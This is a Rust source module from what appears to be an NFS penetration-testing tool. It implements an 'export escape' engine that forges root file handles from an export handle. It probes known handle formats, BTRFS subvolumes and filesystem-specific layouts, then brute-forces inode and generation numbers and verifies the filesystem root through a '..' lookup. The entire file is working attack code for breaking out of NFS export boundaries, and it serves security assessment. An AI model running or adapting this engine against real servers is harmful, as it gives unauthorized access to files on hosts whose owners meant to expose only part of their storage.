//! Version-neutral NFS export escape engine.
//!
//! Constructs filesystem root handles from export handles to break out of
//! NFS export boundaries. Works through the `EscapeProbe` trait so the same
//! algorithm serves both the `escape` subcommand (Nfs3Client) and the
//! `escape-root` shell command (ShellOps).

use std::collections::HashSet;

use crate::engine::file_handle::{EscapeResult, FileHandleAnalyzer, FsType};
use crate::proto::nfs3::types::FileHandle;

/// Probe interface for testing escape candidate handles.
///
/// Abstraction over the NFS version and transport so the escape algorithm
/// is version-neutral. Implemented by both the subcommand (wrapping Nfs3Client)
/// and the shell (wrapping ShellOps).
pub(crate) trait EscapeProbe: Send + Sync {
    /// GETATTR on a raw handle. Returns `Ok((is_directory, fileid))` or `Err`.
    /// On permission denied, the error message must contain "ACCES" or "PERM".
    fn probe_getattr(&self, handle: &[u8]) -> impl Future<Output = anyhow::Result<(bool, u64)>> + Send;

    /// LOOKUP a name in a directory. Returns the child handle bytes.
    fn probe_lookup(&self, dir: &[u8], name: &str) -> impl Future<Output = anyhow::Result<Vec<u8>>> + Send;
}

/// Configuration for the escape algorithm.
pub(crate) struct EscapeConfig {
    /// Number of BTRFS subvolume IDs to try (starting at 256).
    pub btrfs_subvols: u32,
    /// Maximum inode number to scan in the brute-force pass.
    pub max_root_scan: u32,
    /// Print progress lines to stderr.
    pub announce: bool,
}

impl Default for EscapeConfig {
    fn default() -> Self {
        Self { btrfs_subvols: 16, max_root_scan: 200, announce: true }
    }
}

/// Result of the escape attempt.
pub(crate) enum EscapeRootOutcome {
    /// Successfully constructed and verified a root handle.
    Success(EscapeResult),
    /// Handle format is valid (STALE hits) but root not found in scan range.
    StaleNoRoot,
    /// Server rejected handle format (BADHANDLE or non-Linux).
    Unsupported,
}

/// Run the full escape algorithm: known candidates -> BTRFS subvols -> ZFS -> brute-force.
///
/// This is the single entry point for the export-escape primitive. Both
/// `cli/escape.rs` (subcommand) and `shell/mod.rs` (`escape-root` command)
/// call this function through their respective `EscapeProbe` implementations.
pub(crate) async fn find_escape_root(probe: &(impl EscapeProbe + ?Sized), export_handle: &[u8], config: &EscapeConfig) -> EscapeRootOutcome {
    let fh = FileHandle::from_bytes(export_handle);

    // Get the export's own fileid for the identity check in probe_candidate().
    // If a constructed root handle resolves to the same fileid as the export,
    // it is the export itself (whole-filesystem export) and not an escape.
    //
    // Exception: when the seed has fileid_type=0 (MOUNT/LOOKUP root handle),
    // skip the fileid check. The escape constructs a fileid_type=1 handle for
    // the SAME root directory --the fileid will match but the handle bytes
    // differ. This is the desired behavior: converting a type-0 root handle
    // into a type-1 handle that can be further manipulated.
    let seed_fileid_type = export_handle.get(3).copied().unwrap_or(0);
    let export_fileid = if seed_fileid_type == 0 {
        None // type-0 root handle --fileid identity check would reject valid escapes
    } else {
        probe.probe_getattr(export_handle).await.ok().map(|(_, id)| id)
    };

    // Phase 1: INO32_GEN candidates (standard Linux handle format, various root inodes)
    let known = FileHandleAnalyzer::construct_root_candidates(&fh);
    for candidate in &known {
        if config.announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {} ...", candidate.label)));
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 1b: BTRFS subvolume scan
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, config.btrfs_subvols);
    let mut announced: HashSet<u32> = HashSet::new();
    for candidate in &btrfs {
        if config.announce && announced.insert(candidate.inode_number) {
            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 1c: Filesystem-specific constructors (ZFS, EROFS, NILFS2, bcachefs, UDF, ISO9660)
    let fs_specific: Vec<EscapeResult> = [
        FileHandleAnalyzer::construct_zfs_root_handle(&fh),
        FileHandleAnalyzer::construct_erofs_root_handle(&fh, 36),
        FileHandleAnalyzer::construct_nilfs2_root_handles(&fh),
        FileHandleAnalyzer::construct_bcachefs_root_handle(&fh),
        FileHandleAnalyzer::construct_udf_root_candidates(&fh),
        FileHandleAnalyzer::construct_iso9660_root_candidates(&fh),
    ]
    .into_iter()
    .flatten()
    .collect();

    for candidate in &fs_specific {
        if config.announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {} ...", candidate.label)));
        }
        if probe_candidate(probe, candidate, export_fileid, export_handle).await {
            return EscapeRootOutcome::Success(candidate.clone());
        }
    }

    // Phase 2: Brute-force scan.
    // 2a: inodes 1..6 with gen 0..5 (catches reiserfs gen=1, NTFS gen=5, etc.)
    // 2b: inodes 1..max_root_scan with gen=0 only (wider sweep, gen=0 covers most FSes)
    let mut found_stale = !known.is_empty() || !btrfs.is_empty();
    if found_stale && config.announce {
        eprintln!("{}", crate::output::status_warn(&format!("Known candidates returned STALE -- brute-force scanning inodes 1..={}", config.max_root_scan)));
    }

    // 2a: small inode range with gen sweep (6 * 6 = 36 probes, doubled for compound UUID)
    for inode in 1..=5 {
        for generation in 0..=5 {
            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, generation);
            for candidate in &candidates {
                if let Some(outcome) = probe_brute_force(probe, candidate, export_fileid, export_handle, &mut found_stale).await {
                    return outcome;
                }
            }
        }
    }

    // 2b: wider inode range with gen=0 only
    for inode in 6..=config.max_root_scan {
        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, 0);
        for candidate in &candidates {
            if let Some(outcome) = probe_brute_force(probe, candidate, export_fileid, export_handle, &mut found_stale).await {
                return outcome;
            }
        }
    }

    if found_stale { EscapeRootOutcome::StaleNoRoot } else { EscapeRootOutcome::Unsupported }
}

/// Run the full escape algorithm but collect ALL working root handles instead of
/// stopping at the first success.
///
/// Same phases as [`find_escape_root`] (known candidates, BTRFS subvols,
/// filesystem-specific constructors, brute-force scan) but every successful
/// candidate is pushed into the result vector. Deduplication by handle bytes
/// prevents the same root handle from appearing twice when different (inode, gen)
/// combinations produce the same on-wire handle.
pub(crate) async fn find_escape_root_all(probe: &(impl EscapeProbe + ?Sized), export_handle: &[u8], config: &EscapeConfig) -> Vec<EscapeResult> {
    let fh = FileHandle::from_bytes(export_handle);
    let seed_fileid_type = export_handle.get(3).copied().unwrap_or(0);
    let export_fileid = if seed_fileid_type == 0 { None } else { probe.probe_getattr(export_handle).await.ok().map(|(_, id)| id) };
    let mut results: Vec<EscapeResult> = Vec::new();
    let mut seen_handles: HashSet<Vec<u8>> = HashSet::new();

    // Helper closure-equivalent: record a candidate if it probes successfully
    // and we haven't seen this exact handle before.
    let mut try_record = |candidate: &EscapeResult, ok: bool| {
        if ok && seen_handles.insert(candidate.root_handle.as_bytes().to_vec()) {
            results.push(candidate.clone());
        }
    };

    // Phase 1: INO32_GEN candidates
    let known = FileHandleAnalyzer::construct_root_candidates(&fh);
    for candidate in &known {
        if config.announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {} ...", candidate.label)));
        }
        let ok = probe_candidate(probe, candidate, export_fileid, export_handle).await;
        try_record(candidate, ok);
    }

    // Phase 1b: BTRFS subvolume scan
    let btrfs = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, config.btrfs_subvols);
    let mut announced: HashSet<u32> = HashSet::new();
    for candidate in &btrfs {
        if config.announce && announced.insert(candidate.inode_number) {
            eprintln!("{}", crate::output::status_info(&format!("Probing BTRFS subvol {} ...", candidate.inode_number)));
        }
        let ok = probe_candidate(probe, candidate, export_fileid, export_handle).await;
        try_record(candidate, ok);
    }

    // Phase 1c: Filesystem-specific constructors
    let fs_specific: Vec<EscapeResult> = [
        FileHandleAnalyzer::construct_zfs_root_handle(&fh),
        FileHandleAnalyzer::construct_erofs_root_handle(&fh, 36),
        FileHandleAnalyzer::construct_nilfs2_root_handles(&fh),
        FileHandleAnalyzer::construct_bcachefs_root_handle(&fh),
        FileHandleAnalyzer::construct_udf_root_candidates(&fh),
        FileHandleAnalyzer::construct_iso9660_root_candidates(&fh),
    ]
    .into_iter()
    .flatten()
    .collect();

    for candidate in &fs_specific {
        if config.announce {
            eprintln!("{}", crate::output::status_info(&format!("Probing {} ...", candidate.label)));
        }
        let ok = probe_candidate(probe, candidate, export_fileid, export_handle).await;
        try_record(candidate, ok);
    }

    // Phase 2: Brute-force scan
    // 2a: small inode range with gen sweep
    for inode in 1..=5 {
        for generation in 0..=5 {
            let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, generation);
            for candidate in &candidates {
                if let Some(result) = probe_brute_force_hit(probe, candidate, export_fileid, export_handle).await
                    && seen_handles.insert(result.root_handle.as_bytes().to_vec())
                {
                    results.push(result);
                }
            }
        }
    }

    // 2b: wider inode range with gen=0 only
    for inode in 6..=config.max_root_scan {
        let candidates = FileHandleAnalyzer::construct_candidates_all_variants(&fh, inode, 0);
        for candidate in &candidates {
            if let Some(result) = probe_brute_force_hit(probe, candidate, export_fileid, export_handle).await
                && seen_handles.insert(result.root_handle.as_bytes().to_vec())
            {
                results.push(result);
            }
        }
    }

    results
}

/// Like `probe_brute_force` but returns `Some(EscapeResult)` on success without
/// mutating any external state. Used by `find_escape_root_all` which does not
/// need the `found_stale` tracking.
async fn probe_brute_force_hit(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8]) -> Option<EscapeResult> {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((true, fileid)) => {
            if export_fileid.is_none_or(|exp| fileid != exp) && candidate.root_handle.as_bytes() != export_handle && is_root_dir(probe, candidate.root_handle.as_bytes(), fileid).await {
                return Some(candidate.clone());
            }
        },
        Ok((false, _)) => {},
        Err(e) => {
            let msg = format!("{e:#}");
            if is_acces(&msg) {
                return Some(candidate.clone());
            }
        },
    }
    None
}

/// Probe a brute-force candidate. Returns `Some(Success)` if the candidate is
/// confirmed as the filesystem root, `None` to continue scanning.
/// Updates `found_stale` when the handle format is accepted.
async fn probe_brute_force(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8], found_stale: &mut bool) -> Option<EscapeRootOutcome> {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((true, fileid)) => {
            if export_fileid.is_none_or(|exp| fileid != exp) && candidate.root_handle.as_bytes() != export_handle && is_root_dir(probe, candidate.root_handle.as_bytes(), fileid).await {
                return Some(EscapeRootOutcome::Success(candidate.clone()));
            }
            *found_stale = true;
        },
        Ok((false, _)) => {
            *found_stale = true;
        },
        Err(e) => {
            let msg = format!("{e:#}");
            if is_acces(&msg) || msg.contains("STALE") || msg.contains("stale") {
                *found_stale = true;
            }
        },
    }
    None
}

/// Test a single candidate handle against the probe.
async fn probe_candidate(probe: &(impl EscapeProbe + ?Sized), candidate: &EscapeResult, export_fileid: Option<u64>, export_handle: &[u8]) -> bool {
    match probe.probe_getattr(candidate.root_handle.as_bytes()).await {
        Ok((is_dir, fileid)) => {
            if !is_dir {
                return false;
            }
            // Handle bytes must differ from the export handle (identity check).
            if candidate.root_handle.as_bytes() == export_handle {
                return false;
            }
            // For non-BTRFS: a matching fileid means the constructed handle
            // resolves to the export's own root directory (whole-filesystem export).
            // BTRFS subvolumes share fileid 256, so we skip the fileid check.
            if candidate.fs_type != FsType::Btrfs && export_fileid.is_some_and(|exp| fileid == exp) {
                return false;
            }
            true
        },
        Err(e) => {
            let msg = format!("{e:#}");
            // ACCES/PERM = format accepted, root_squash blocks read.
            // The handle format is valid even though we cannot read attrs.
            is_acces(&msg)
        },
    }
}

/// Confirm a directory is the filesystem root: LOOKUP ".." must resolve back to self.
///
/// The filesystem root is its own parent (per POSIX), so `..` from the root
/// resolves to the root itself. A subdirectory has a different parent.
async fn is_root_dir(probe: &(impl EscapeProbe + ?Sized), handle: &[u8], self_fileid: u64) -> bool {
    let Ok(parent) = probe.probe_lookup(handle, "..").await else {
        return false;
    };
    let Ok((_, parent_fileid)) = probe.probe_getattr(&parent).await else {
        return false;
    };
    parent_fileid == self_fileid
}

/// Check if an error message indicates a permission denial.
fn is_acces(msg: &str) -> bool {
    msg.contains("ACCES") || msg.contains("PERM")
}
